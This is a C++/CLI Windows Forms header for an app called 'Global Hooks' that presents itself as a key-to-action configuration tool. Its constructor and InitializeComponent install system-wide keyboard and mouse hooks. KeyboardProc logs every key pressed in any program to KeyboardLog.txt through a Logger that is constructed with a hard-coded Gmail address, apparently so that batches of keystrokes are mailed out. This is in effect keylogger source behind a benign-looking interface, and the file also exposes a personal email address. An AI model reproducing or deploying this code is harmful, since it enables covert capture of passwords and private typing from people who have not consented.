#pragma once
#include <windows.h>
#include "KeyHook.h"
#include "Logger.h"
#define LOGGER_KEYBOARD L"KeyboardLog.txt"
#define LOGGER_MOUSE L"MouseLog.txt"
#pragma comment (lib, "User32.lib")
namespace GlobalHooks {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace System::Runtime::InteropServices;

	public ref class MainWindow : public System::Windows::Forms::Form
	{
	public:
		MainWindow(void)
		{
			keyboardHook = new KeyHook();
			keyboardLogger = new Logger(100, "hazy142@gmail.com", LOGGER_KEYBOARD);
			InitializeComponent();
		}

	protected:
		~MainWindow()
		{
			if (keyboardHook)
				delete keyboardHook;
			if (keyboardLogger)
				delete keyboardLogger;
			UnhookWindowsHookEx(keyboardHookHandle);
			if (components)
			{
				delete components;
			}
		}

		static IntPtr MouseProc(int nCode, WPARAM wParam,
			LPARAM lParam)
		{
			MSLLHOOKSTRUCT hookedMouse = *((MSLLHOOKSTRUCT*)lParam);
			if (wParam == WM_LBUTTONDOWN)
			{
				int s = 1;
			}
			if (hookedMouse.mouseData == XBUTTON2)
			{
				int s = 1;
			}
			return (IntPtr)CallNextHookEx(mouseHookHandle, nCode, wParam, lParam);
		}

		static IntPtr KeyboardProc(int nCode, WPARAM wParam,
			LPARAM lParam)
		{
			DWORD SHIFT_key = 0;
			DWORD CTRL_key = 0;
			DWORD ALT_key = 0;
			if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
			{
				KBDLLHOOKSTRUCT hookedKey = *((KBDLLHOOKSTRUCT*)lParam);
				string pressedKey = keyboardHook->getNameFromStr(hookedKey);
				string logMessage;
				logMessage.append(pressedKey);
				logMessage.append(" was pressed.");
				keyboardLogger->addMessage(logMessage);
			}
			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);
		}

		virtual void WndProc(Message %m) override
		{
			switch (m.Msg)
			{
			case WM_KEYDOWN:
			{
				int z = 1;
				break;
			}
			default:
				Form::WndProc(m);
				break;
			}
		}
		
	private:
		static KeyHook *keyboardHook;
		static Logger *keyboardLogger;
		static HHOOK keyboardHookHandle;
		static HHOOK mouseHookHandle;
		System::Windows::Forms::Label^  currentMode;
		System::Windows::Forms::Label^  labelMode;
		System::Windows::Forms::ComboBox^  comboKey1;
		System::Windows::Forms::Button^  buttonSetConfig;
		System::Windows::Forms::ComboBox^  comboAction1;
		System::Windows::Forms::Label^  action;
		System::Windows::Forms::ComboBox^  comboKey2;
		System::Windows::Forms::ComboBox^  comboKey3;
		System::Windows::Forms::ComboBox^  comboKey4;
		System::Windows::Forms::ComboBox^  comboKey5;
		System::Windows::Forms::ComboBox^  comboAction2;
		System::Windows::Forms::ComboBox^  comboAction3;
		System::Windows::Forms::ComboBox^  comboAction4;
		System::Windows::Forms::ComboBox^  comboAction5;
		System::Windows::Forms::Label^  key;
		System::ComponentModel::Container ^components;

		void InitializeComponent(void)
		{
			keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, 0, 0);
			mouseHookHandle = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseProc, 0, 0);
			this->currentMode = (gcnew System::Windows::Forms::Label());
			this->labelMode = (gcnew System::Windows::Forms::Label());
			this->comboKey1 = (gcnew System::Windows::Forms::ComboBox());
			this->buttonSetConfig = (gcnew System::Windows::Forms::Button());
			this->comboAction1 = (gcnew System::Windows::Forms::ComboBox());
			this->action = (gcnew System::Windows::Forms::Label());
			this->comboKey2 = (gcnew System::Windows::Forms::ComboBox());
			this->comboKey3 = (gcnew System::Windows::Forms::ComboBox());
			this->comboKey4 = (gcnew System::Windows::Forms::ComboBox());
			this->comboKey5 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction2 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction3 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction4 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction5 = (gcnew System::Windows::Forms::ComboBox());
			this->key = (gcnew System::Windows::Forms::Label());
			this->SuspendLayout();
			// 
			// currentMode
			// 
			this->currentMode->AutoSize = true;
			this->currentMode->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->currentMode->Location = System::Drawing::Point(12, 304);
			this->currentMode->Name = L"currentMode";
			this->currentMode->Size = System::Drawing::Size(98, 17);
			this->currentMode->TabIndex = 0;
			this->currentMode->Text = L"Current mode:";
			this->currentMode->UseMnemonic = false;
			// 
			// labelMode
			// 
			this->labelMode->AutoSize = true;
			this->labelMode->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->labelMode->Location = System::Drawing::Point(116, 304);
			this->labelMode->Name = L"labelMode";
			this->labelMode->Size = System::Drawing::Size(43, 17);
			this->labelMode->TabIndex = 1;
			this->labelMode->Text = L"mode";
			// 
			// comboKey1
			// 
			this->comboKey1->FormattingEnabled = true;
			this->comboKey1->Location = System::Drawing::Point(58, 66);
			this->comboKey1->Name = L"comboKey1";
			this->comboKey1->Size = System::Drawing::Size(121, 21);
			this->comboKey1->TabIndex = 2;
			// 
			// buttonSetConfig
			// 
			this->buttonSetConfig->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->buttonSetConfig->Location = System::Drawing::Point(402, 298);
			this->buttonSetConfig->Name = L"buttonSetConfig";
			this->buttonSetConfig->Size = System::Drawing::Size(75, 23);
			this->buttonSetConfig->TabIndex = 3;
			this->buttonSetConfig->Text = L"Set config";
			this->buttonSetConfig->UseVisualStyleBackColor = true;
			// 
			// comboAction1
			// 
			this->comboAction1->FormattingEnabled = true;
			this->comboAction1->Location = System::Drawing::Point(302, 64);
			this->comboAction1->Name = L"comboAction1";
			this->comboAction1->Size = System::Drawing::Size(121, 21);
			this->comboAction1->TabIndex = 4;
			// 
			// action
			// 
			this->action->AutoSize = true;
			this->action->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 11, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->action->Location = System::Drawing::Point(335, 26);
			this->action->Name = L"action";
			this->action->Size = System::Drawing::Size(53, 18);
			this->action->TabIndex = 5;
			this->action->Text = L"Action:";
			// 
			// comboKey2
			// 
			this->comboKey2->FormattingEnabled = true;
			this->comboKey2->Location = System::Drawing::Point(58, 105);
			this->comboKey2->Name = L"comboKey2";
			this->comboKey2->Size = System::Drawing::Size(121, 21);
			this->comboKey2->TabIndex = 6;
			// 
			// comboKey3
			// 
			this->comboKey3->FormattingEnabled = true;
			this->comboKey3->Location = System::Drawing::Point(58, 151);
			this->comboKey3->Name = L"comboKey3";
			this->comboKey3->Size = System::Drawing::Size(121, 21);
			this->comboKey3->TabIndex = 7;
			// 
			// comboKey4
			// 
			this->comboKey4->FormattingEnabled = true;
			this->comboKey4->Location = System::Drawing::Point(58, 194);
			this->comboKey4->Name = L"comboKey4";
			this->comboKey4->Size = System::Drawing::Size(121, 21);
			this->comboKey4->TabIndex = 8;
			// 
			// comboKey5
			// 
			this->comboKey5->FormattingEnabled = true;
			this->comboKey5->Location = System::Drawing::Point(58, 238);
			this->comboKey5->Name = L"comboKey5";
			this->comboKey5->Size = System::Drawing::Size(121, 21);
			this->comboKey5->TabIndex = 9;
			// 
			// comboAction2
			// 
			this->comboAction2->FormattingEnabled = true;
			this->comboAction2->Location = System::Drawing::Point(302, 105);
			this->comboAction2->Name = L"comboAction2";
			this->comboAction2->Size = System::Drawing::Size(121, 21);
			this->comboAction2->TabIndex = 10;
			// 
			// comboAction3
			// 
			this->comboAction3->FormattingEnabled = true;
			this->comboAction3->Location = System::Drawing::Point(302, 151);
			this->comboAction3->Name = L"comboAction3";
			this->comboAction3->Size = System::Drawing::Size(121, 21);
			this->comboAction3->TabIndex = 11;
			// 
			// comboAction4
			// 
			this->comboAction4->FormattingEnabled = true;
			this->comboAction4->Location = System::Drawing::Point(302, 194);
			this->comboAction4->Name = L"comboAction4";
			this->comboAction4->Size = System::Drawing::Size(121, 21);
			this->comboAction4->TabIndex = 12;
			// 
			// comboAction5
			// 
			this->comboAction5->FormattingEnabled = true;
			this->comboAction5->Location = System::Drawing::Point(302, 238);
			this->comboAction5->Name = L"comboAction5";
			this->comboAction5->Size = System::Drawing::Size(121, 21);
			this->comboAction5->TabIndex = 13;
			// 
			// key
			// 
			this->key->AutoSize = true;
			this->key->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 11, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->key->Location = System::Drawing::Point(96, 26);
			this->key->Name = L"key";
			this->key->Size = System::Drawing::Size(37, 18);
			this->key->TabIndex = 14;
			this->key->Text = L"Key:";
			// 
			// MainWindow
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(489, 326);
			this->Controls->Add(this->key);
			this->Controls->Add(this->comboAction5);
			this->Controls->Add(this->comboAction4);
			this->Controls->Add(this->comboAction3);
			this->Controls->Add(this->comboAction2);
			this->Controls->Add(this->comboKey5);
			this->Controls->Add(this->comboKey4);
			this->Controls->Add(this->comboKey3);
			this->Controls->Add(this->comboKey2);
			this->Controls->Add(this->action);
			this->Controls->Add(this->comboAction1);
			this->Controls->Add(this->buttonSetConfig);
			this->Controls->Add(this->comboKey1);
			this->Controls->Add(this->labelMode);
			this->Controls->Add(this->currentMode);
			this->Name = L"MainWindow";
			this->Text = L"Global Hooks";
			this->ResumeLayout(false);
			this->PerformLayout();
			comboKey1->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey2->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey3->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey4->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey5->Items->AddRange(Enum::GetNames(Keys::typeid));
		}
	};
}
